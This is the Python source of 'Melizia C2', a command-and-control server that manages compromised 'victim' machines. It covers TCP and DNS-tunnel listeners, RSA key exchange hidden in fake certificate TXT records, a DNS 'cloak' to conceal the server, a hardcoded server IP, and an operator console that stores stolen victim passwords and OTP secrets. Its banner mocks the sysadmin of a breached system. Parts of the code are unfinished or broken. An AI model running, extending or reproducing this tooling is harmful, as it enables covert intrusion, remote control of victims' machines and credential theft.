import socket, threading, readline, secrets, hashlib, sqlite3, base64
from datetime import datetime
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
import re
import socketserver
from colorama import Fore, Back, Style
from rich import *
import warnings
from rich.prompt import *
from rich.console import Console
from rich.table import Table
import sys, os
from cryptography.hazmat.primitives.serialization import load_pem_public_key

# Global variable that mantain client's connections
connections = []
machineClassList = {}
activeTargetID = "Zombie"
activeConnection = None
console = Console()

from dnslib import QTYPE, RR, DNSLabel, dns
from dnslib.server import BaseResolver as LibBaseResolver, DNSServer as LibDNSServer
from dnslib import *

latestVictim = ""

TYPE_LOOKUP = {
        'A': (dns.A, QTYPE.A),
        'AAAA': (dns.AAAA, QTYPE.AAAA),
        'CAA': (dns.CAA, QTYPE.CAA),
        'CNAME': (dns.CNAME, QTYPE.CNAME),
        'DNSKEY': (dns.DNSKEY, QTYPE.DNSKEY),                                                                                                                                                                  
    'MX': (dns.MX, QTYPE.MX),                                                                                                                                                                              
    'NAPTR': (dns.NAPTR, QTYPE.NAPTR),                                                                                                                                                                     
    'NS': (dns.NS, QTYPE.NS),                                                                                                                                                                              
    'PTR': (dns.PTR, QTYPE.PTR),                                                                                                                                                                           
    'RRSIG': (dns.RRSIG, QTYPE.RRSIG),                                                                                                                                                                     
    'SOA': (dns.SOA, QTYPE.SOA),                                                                                                                                                                           
    'SRV': (dns.SRV, QTYPE.SRV),                                                                                                                                                                           
    'TXT': (dns.TXT, QTYPE.TXT),                                                                                                                                                                           
    'SPF': (dns.TXT, QTYPE.TXT),                                                                                                                                                                           
}


c2Statistics = {
        "Total Victims":0,
        "Prefered Protocol":"",
        "Latest Victim":"",
        "Total Notes":0,
        "Total Passwords":0,
        "Total Requests":0,
        "Active Listeners":[],
        "Cloak State":False,
        "Killed Victims":0,
        "Sleeping Victims":0,
        "Active Victims":0,
        "Invalid Requests":0
        }

import time, math
from datetime import datetime, timedelta

class Machine:
    def __init__(self, connection, machineName, RSA_private_key, RSA_public_key, CustomName, RSA_Victim_Public_Key = None, victimNotes={"passwords":{},"notes":{}}):
        m = hashlib.sha256()
        m.update(RSA_public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
        self.RSA_public_key_hash = m.hexdigest()
        self.connection = connection
        self.machineName = machineName
        self.RSA_private_key = RSA_private_key
        self.RSA_public_key = RSA_public_key
        self.RSA_Victim_Public_Key = RSA_Victim_Public_Key
        n = hashlib.sha256()
        n.update(RSA_Victim_Public_Key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
        self.RSA_Victim_Public_Key_hash = n.hexdigest()
        self.CustomName = CustomName
        self.pingTime = None
        self.Uptime = 0
        self.victimNotes = victimNotes

    def send_ping(self):
        self.pingTime = datetime.now()

    def get_uptime(self):
        uptime = 0
        if self.pingTime is not None:
            uptime = int((datetime.now() - self.pingTime).total_seconds())
        self.Uptime = uptime
        return self.Uptime

def generate_machine_id():
    randbits = secrets.randbits(1024)
    m = hashlib.sha256()
    m.update(str(randbits).encode("utf-8"))
    createdHash = m.hexdigest()
    return createdHash

def generate_RSA_keypair():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    public_key = private_key.public_key()
    return (private_key, public_key)

msg = ""
test = 0


def handle_user_connection(connection: socket.socket, address: str) -> None:
    global activeTargetID, msg, test
    '''
        Get user connection in order to keep receiving their messages and
        sent to others users/connections.
    '''

    while True:
        if test == 0:
            private_key, public_key = generate_RSA_keypair()
            zombie_id = generate_machine_id()
            #machineClassList.update({zombie_id:Machine(connection, None, private_key, public_key)})
            public_pem = public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo)
            m = hashlib.sha256()
            m.update(public_pem)
            createdHashPK = m.hexdigest()

            machineClassList.update({createdHashPK:Machine(connection, None, private_key, public_key, "Unknown")})
            connection.send(public_pem)

            console.print(f"\n[bold yellow][*][/bold yellow] Sent RSA public key to zombie, now known as [bold blue]{m.hexdigest()}[/bold blue]")
            console.print(f"[bold yellow][*][/bold yellow] [bold blue]SHA256 of public cert[/bold blue]: {machineClassList[createdHashPK].RSA_public_key_hash}")

            msg = connection.recv(512)
            if(msg):
                msg = msg.decode().split("|")
                if(msg[0] == "1"):
                    console.print(f"[bold yellow][*][/bold yellow] Receiving public RSA key from victim... {msg[1]}")
                    print(msg[2])
                for k, v in machineClassList.items():
                    if v.RSA_public_key_hash == msg[0]:
                        plaintext = v.RSA_private_key.decrypt(
                            base64.b32decode(msg[1]),
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        plaintext = plaintext.decode().split("|")
                        console.print(f"[bold yellow][!][/bold yellow] [bold blue]\"{plaintext[0]}\"[/bold blue] Called home! say hello to \"[bold blue]{plaintext[1]}[/bold blue]\"!\n[bold blue]User ID[/bold blue]: {msg[0]}")
                    else:
                        connection.close()
            connection.send(str("testing").encode("utf-8"))
            activeTargetID = "Zombie"
            test = 1
            return 0

def server() -> None:
    '''
        Main process that receive client's connections and start a new thread
        to handle their messages
    '''

    LISTENING_PORT = 1339
    
    try:
        # Create server and specifying that it can only handle 4 connections by time!
        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_instance.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 )
        socket_instance.bind(('', LISTENING_PORT))
        socket_instance.listen(4)

        while True:

            # Accept client connection
            socket_connection, address = socket_instance.accept()
            # Add client connection to connections list
            connections.append(socket_connection)
            # Start a new thread to handle client connection and receive it's messages
            # in order to send to others connections
            threading.Thread(target=handle_user_connection, args=[socket_connection, address]).start()

    except KeyboardInterrupt:
        socket_instance.close()

def list_listeners():
    return 0

def list_computers():
    console = Console()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("User ID", style="dim")
    table.add_column("Name")
    table.add_column("Uptime")

    for k,v in machineClassList.items():
        table.add_row(
        k, v.CustomName, str(v.get_uptime())
        )

    #machineClassList[userid].get_uptime()

    console.print(table)

def get_hostname(arg):
    global activeTargetID
    arg = arg.strip()
    activeTargetID = arg
    print(f"sending get_hostname to {arg}\n")
    connectionHandler = machineClassList[arg]
    connectionHandler.connection.send(b'ghostname')


class Utils:
    def RSAEncrypt(self, plaintext, private_key):
        encrypted = base64.b64encode(private_key.encrypt(
                plaintext,
                padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
                )
        ))
        return encrypted
import pyotp
class VictimPayloads:
    def __init__(self):
        self.availableVictimCommands = {"rename":"Rename victim (Usage: rename (name))",
                           "info": "List computer info",
                           "back":"Return to main menu",
                           "sleep":"Hibernate victim (Usage: sleep (time in seconds))",
                           "notes":"Add victim notes"}
    def notes(self, public_key_hash):
        global c2Statistics
        while True:
            command = Prompt.ask(f"\n[bold blue]({machineClassList[public_key_hash].CustomName}[/bold blue]|[bold yellow]NOTES)[/bold yellow]> ", choices=["note", "password", "viewp", "viewn", "help", "back"], default="note")
            if command == "note":
                try:
                    note_group = input("Group (Default) > ")
                    if note_group == "":
                        note_group = "Default"
                    note = input("Note > ")
                    machineClassList[public_key_hash].victimNotes["note"].update({note_group:append(note)})
                    c2Statistics["Total Notes"] += 1
                except:
                    pass
       #machineClassList[public_key_hash].victimNotes["notes"][note_group].append(note)
                #machineClassList[public_key_hash].victimNotes["notes"][note_group] = note
            if command == "password":
                username = input("Username > ")
                password = input("Password > ")
                totp = ""
                aditionalInformation = ""
                aditionalInfoASK = Confirm.ask("Aditional information?")
                if aditionalInfoASK == True:
                    aditionalInformation = input("Aditional information > ")
                otpASK = Confirm.ask("Add OTP? (secret key only!)")
                if otpASK == True:
                    otpSecret = input("OTP secret > ")
                    totp = pyotp.TOTP(otpSecret)
                machineClassList[public_key_hash].victimNotes["passwords"].update({username:[password, totp, aditionalInformation]})
                c2Statistics["Total Passwords"] += 1
            if command == "viewp":
                try:
                    for k in machineClassList[public_key_hash].victimNotes["passwords"].keys():
                        password = machineClassList[public_key_hash].victimNotes["passwords"][k][0]
                        totp = machineClassList[public_key_hash].victimNotes["passwords"][k][1]
                        if totp != "":
                            totp = totp.now()
                        aditional = machineClassList[public_key_hash].victimNotes["passwords"][k][2]
                        console.print(f"[bold blue]Username[/bold blue]: {k}\n- [bold blue]Password[/bold blue]: {password}\n- [bold blue]TOTP[/bold blue]: {totp}\n- [bold blue]Additional[/bold blue]: {aditional}\n")
                except:
                    pass
            if command == "viewn":
                try:
                    for k in machineClassList[public_key_hash].victimNotes["passwords"].keys():
                        for x in machineClassList[public_key_hash].victimNotes["passwords"][x]:
                            console.print(f"[bold blue]Group[/bold blue]: {k}\n - [bold blue]Note[/bold blue]: {x}") 
                except Exception as err:
                    print(err)
                    pass
            if command == "back":
                break
    
    def MethodToPacketEncoder(self, method, public_key_hash, *args, **kwargs):
        utils = Utils()
        match method:
            case "sleep":
                print(kwargs)
                sleepTime = kwargs.get('sleepTime', None)
                console.print(f"[bold yellow][*][/bold yellow] Sent \"sleep\" command to victim, sleeping for {sleepTime} seconds...\n")
                packet = public_key_hash + "|" + "s" + "|" + str(sleepTime)
                print(packet)
                ciphertext = utils.RSAEncrypt(packet, machineClassList[public_key_hash].RSA_private_key)
                print(ciphertext)
                return ciphertext

            case "command":
                command = kwargs.get('command', None)
                console.print(f"[bold yellow][*][/bold yellow] Sent \"{command}\" to victim\n")

    def ListenerToProtoSender(proto):
        print(proto)

    def sleep(self, sleepTime, public_key_hash):
        packet = self.MethodToPacketEncoder("sleep", public_key_hash, sleepTime=sleepTime)

    def command(self, command):
        packet = self.MethodToPacketEncoder("command", public_key_hash, sleepTime=sleepTime)

    def exit(self):
        return 0

    def rename(self, public_key_hash, username):
        console.print(f"[bold green][+][/bold green] Renamed [bold blue]{machineClassList[public_key_hash].CustomName}[/bold blue] to [bold blue]{username}[/bold blue]\n")
        machineClassList[public_key_hash].CustomName = username
    
    def info(self, userid):
        console.print(f"""
	[bold blue]User ID[/bold blue]: {userid}
	[bold blue]Name[/bold blue]: {machineClassList[userid].CustomName}
	[bold blue]Uptime[/bold blue]: {machineClassList[userid].get_uptime()}
	[bold blue]Victim Public Key hash[/bold blue]: {machineClassList[userid].RSA_Victim_Public_Key_hash}
	[bold blue]C2 Public key hash[/bold blue]: {machineClassList[userid].RSA_public_key_hash}
	""")

    def help(self):
        console.print(f"- [bold green]Interact Usage[/bold green]:\n")
        for k, v in self.availableVictimCommands.items():
            console.print(f"[bold blue]{k}[/bold blue]: {v}")

def victimInteract(public_key_hash):
    victim = None
    victimHandler = VictimPayloads()
    availableVictimCommands = victimHandler.availableVictimCommands
    commands = list(availableVictimCommands)
    try:
        victim = machineClassList[public_key_hash]
    except:
        console.print(f"[bold red][!][/bold red] Victim ID [bold blue]{public_key_hash}[/bold blue] not found!")
        return 0
    while True:
       issuedCommand = input(f"\n{Fore.BLUE}({machineClassList[public_key_hash].CustomName}){Style.RESET_ALL}> ").split()
       if(issuedCommand[0] == commands[0]):
            victimHandler.rename(public_key_hash, issuedCommand[1])

       if(issuedCommand[0] == commands[1]):
            victimHandler.info(public_key_hash)

       if(issuedCommand[0] == "help"):
            victimHandler.help()

       if(issuedCommand[0] == commands[2]):
           break
       if(issuedCommand[0] == commands[3]):
           victimHandler.sleep(issuedCommand[1], public_key_hash)
       if(issuedCommand[0] == commands[4]):
           victimHandler.notes(public_key_hash)
       


def getC2Statistics():
    global c2Statistics
    console.print(c2Statistics)

availableMainCommands = {"list_listeners":"List C2 listeners (DNS, HTTP, TCP, HTTPS)", 
                         "list_computers":"List connected computers",
                         "get_hostname":"Get a computer hostname (Usage: get_hostname (UID))",
                         "interact":"Interact with a specific computer (Usage: interact (UID))",
                         "exit":"Exit from Melizia",
                         "cloak":"Overwrite DNS nameserver AAAA/A to 127.0.0.1",
                         "key_provisioning":"Deny/Allow creation of new RSA public keys",
                         "delete":"Delete a specific host (RSA keys, notes and entry are destroyed; Usage: delete (UID))",
                         "statistics":"Show C2 event statistics"}
dnsCloaked = False
IP = "20.231.9.148"
IPV6 = "0000:0000:0000:0000:0000:ffff:14e7:0994"

def deleteHost(host):
    global c2Statistics
    try:
        machineClassList.pop(host)
        console.print(f"[bold blue]{host}[/bold blue] deleted!")
        c2Statistics["Killed Victims"] += 1
    except:
        console.print("UID not found")

def DNSCloak():
    global dnsCloaked, IP, IPV6
    if(dnsCloaked == True):
        console.print(f"DNS Cloaking: {dnsCloaked}")
        IP = "127.0.0.1"
        IPV6 = "0000:0000:0000:0000:0000:0000:0000:0001"
    else:
        console.print(f"DNS Cloaking: {dnsCloaked}")
        IP = "20.231.9.148"
        IPV6 = "0000:0000:0000:0000:0000:ffff:14e7"
keyProvisioning = True
generatedCertificates = []
def command():
    global dnsCloaked, keyProvisioning, latestVictim
    commands = list(availableMainCommands)
    while True:
        try:
            command = input(f"\n{Fore.GREEN}(Melizia)>{Style.RESET_ALL} ").split()

            if(command[0] == commands[0]):
                get_computer_hostname()
            if(command[0]  == commands[1]):
                list_computers()
            if(command[0]  == commands[2]):
                get_hostname(command[1])
            if(command[0] == commands[3]):
                if latestVictim != "":
                    victimInteract(latestVictim)
                else:
                    victimInteract(command[1])
            if(command[0] == "help"):
                console.print(f"- [bold green]Melizia Usage[/bold green]:\n")
                for k, v in availableMainCommands.items():
                    console.print(f"[bold blue]{k}[/bold blue]: {v}")
            if(command[0] == commands[4]):
                console.print(f"See you space cowboy... killing {len(machineClassList)} spaceships!\n")
                os._exit(1)
            if(command[0] == commands[5]):
                c2Statistics["Cloak State"] = dnsCloaked
                if(dnsCloaked == True):
                    dnsCloaked = False
                else:
                    dnsCloaked = True
                DNSCloak()
            if(command[0] == commands[6]):
                if(keyProvisioning == True):
                    keyProvisioning = False
                else:
                    keyProvisioning = True
                console.print(f"Key provisioning: {keyProvisioning}")
            if(command[0] == commands[7]):
                deleteHost(command[1])
            if(command[0] == commands[8]):
                getC2Statistics()

        except IndexError:
            pass

def showCommandResults(message, public_key):
    print(f"\n{machineClassList[public_key].CustomName} :: {message}\n")

def checkConsecutive(l):
    return sorted(l) == list(range(min(l), max(l)+1))

commandList = []

statistics = {"BrokenPackages":0}

def decryptRSAByPublicKey(public_key, message):
    plaintext = ""
    for k, v in machineClassList.items():
        if v.RSA_public_key_hash == public_key:
            plaintext = v.RSA_private_key.decrypt(base64.b32decode(message),padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
            return plaintext
    return plaintext


def decodeCommand(command):
    global statistics, generatedCertificates, latestVictim, c2Statistics
    try:
        command = base64.b32decode(command).decode()
        command = command.split("|")
        if(command[0] == "1"):
            certificate = base64.b32decode(command[2]).decode()
            key = load_pem_public_key(certificate.encode("utf-8"), default_backend())
            for x in generatedCertificates:
                if x["hashPK"] == command[1]:
                    latestVictim = command[1]
                    c2Statistics["Latest Victim"] = latestVictim
                    c2Statistics["Total Victims"] += 1
                    machineClassList.update({command[1]:Machine("DNS", None, x["private_key"], x["public_key"], "Unknown", key)})
                    victimHash = machineClassList[command[1]].RSA_public_key_hash
                    console.print(f"\n[bold blue]A spaceship arrived![/bold blue]\n[bold blue]\"{victimHash}\"[/bold blue] Called home!")
                    generatedCertificates.clear()
        if(command[0] == "2"):
            machineClassList[command[1]].pingTime = datetime.now()
#            console.print(f"{machineClassList[command[1]].send_ping()}")
        #messageResponse = decryptRSAByPublicKey(command[0], command[1])
        #showCommandResults(command[0], command[1])
    except Exception as err:
 #       print(err)
        pass


def dnsDataParse(packet):
    global commandList
    regex = r"-(.*)-"
    commandEncoded = ""
    matches = re.search(regex, packet)
    metadata = str(matches.group(0)).split("-")
    commandEnumeratorList = []
    if((len(packet)-len(matches.group(0)) + 1) >= int(metadata[2])):
       data = packet.replace(matches.group(0), "").replace(".","")
       commandList.append({"data":data,"order":metadata[1]})
       from operator import itemgetter
       newCommandList = sorted(commandList, key=itemgetter('order')) 
       for x in newCommandList:
           commandEnumeratorList.append(int(x['order']))
       if(checkConsecutive(commandEnumeratorList)):
          for x in newCommandList:
              if "_" in x['data']:
                 c2Statistics["Total Requests"] += 1
                 x['data'] = x['data'].replace('_','')
                 for y in newCommandList:
                     commandEncoded += y['data']
                 decodeCommand(commandEncoded)
                 commandEnumeratorList.clear()
                 commandList.clear()


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


D = DomainName('demoni386.ninja')

soa_record = SOA(
    mname=D.ns1,  # primary name server
    rname=D.andrei,  # email of the domain administrator
    times=(
        201307231,  # serial number
        60 * 60 * 1,  # refresh
        60 * 60 * 3,  # retry
        60 * 60 * 24,  # expire
        60 * 60 * 1,  # minimum
    )
)
ns_records = [NS(D.ns1), NS(D.ns2)]
records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
    D.ns2: [A(IP)],
    D.mail: [A(IP)],
    D.andrei: [CNAME(D)],
    }


import binascii
def generateCertificate():
    global dnsCloaked, generatedCertificates
    if dnsCloaked == True:
        return ""
    private_key, public_key = generate_RSA_keypair()
    privkey_str = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
    )   

    #print(privkey_str.decode('utf-8'))
    public_pem = base64.b32encode(public_key.public_bytes(encoding=serialization.Encoding.PEM,format=serialization.PublicFormat.SubjectPublicKeyInfo))
    public_pem_split = [public_pem[i: i + 220] for i in range(0, len(public_pem), 220)]
    m = hashlib.sha256()
    m.update(base64.b32decode(public_pem))
    createdHashPK = m.hexdigest()
    generatedCertificates.append({"public_key":public_key, "private_key":private_key, "hashPK":createdHashPK})
    fakeTXTList = []
    for x in public_pem_split:
        fakeTXTList.append(f"globalsign-smime-dv={x.decode()}")
    return fakeTXTList

def sendDNSresponse(data):
    global keyProvisioning
    try:
        request = DNSRecord.parse(data)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        qname = request.q.qname
        qn = str(qname)
        qtype = request.q.qtype
        qt = QTYPE[qtype]
        if qt == "A":
            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, ttl=5, rdata=dns.A(IP)))
        if qt == "AAAA":
            reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, ttl=5, rdata=dns.AAAA(IPV6)))
        if qt == "TXT":
            if keyProvisioning == False:
                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT("")))
            else:
                certificate = generateCertificate()
                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(certificate)))
        return reply.pack()
    except:
        pass

class DNSServer:
   def __init__(self, address, port, domain):
        self.address = address
        self.port = port
        self.domain = domain
   def start(self):
       global c2Statistics
       data = None
       addr = None
       try:
           console.print(f"[bold yellow][!][/bold yellow] DNS Server started\n")
           udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
           udps.bind(('',self.port))
       except:
           console.print(f"[bold red][!][/bold red] Failed to start DNS Server\n")
           return 0
       c2Statistics["Active Listeners"].append("DNS")
       while True:
           try:
               data, addr = udps.recvfrom(512)
               udps.sendto(sendDNSresponse(data),addr)
               ini=12
               lon=data[ini]
               receivedData = ""
               while lon != 0:
                   receivedData+=data[ini+1:ini+lon+1].decode('ascii')+'.'
                   ini+=lon+1
                   lon=data[ini]
                   if self.domain in receivedData:
                       receivedData = receivedData.replace(self.domain, "")
                       if(len(receivedData) > len(self.domain+".")):
                           dnsDataParse(receivedData)
                    #c2Statistics["Invalid Requests"] += 1
           except:
               pass

import signal
if __name__ == "__main__":
    console.print(f"""
[bold red] Melizia C2 [/bold red]
Pwned by trololo gang! kek kek keke kekw
[bold blue]- "SYSADMIN VOCÊ ESTÁ SENDO HIPNOTIZADO, ESQUEÇA QUE ESSA OWNADA EXISTIU"[/bold blue]
[bold green]

        |) /\ |\ | /`  |
        |) \/ | \| \]  .
          __________         |) /\ |\ | /`  |
         /________ /|        |) \/ | \| \]  .
        |   X|I   | |
        |    |    | | |) /\ |\ | /`  |
        |IX  * III| | |) \/ | \| \]  .
        |    |    | |
        |____VI___| |         |) /\ |\ | /`  |
        |    /    | |         |) \/ | \| \]  .
        |   /     | |
        |  /      | |     |) /\ |\ | /`  |
        |( )      | |     |) \/ | \| \]  .
        |_________|/
                     |) /\ |\ | /`  |
                     |) \/ | \| \]  .
[bold green]
    """)
    console.print("Ctrl+C is disabled! please use \"exit\" to exit from Melizia\nUse \"help\" to see the available commands!\n")
#    signal.signal(signal.SIGINT, signal.SIG_IGN)
    serverThread = threading.Thread(target=server)
    commandThread = threading.Thread(target=command)
    serverThread.start()
    commandThread.start()
    DNSServer = DNSServer("0.0.0.0", 53, ".demoni386.ninja")
    DNSServer.start()
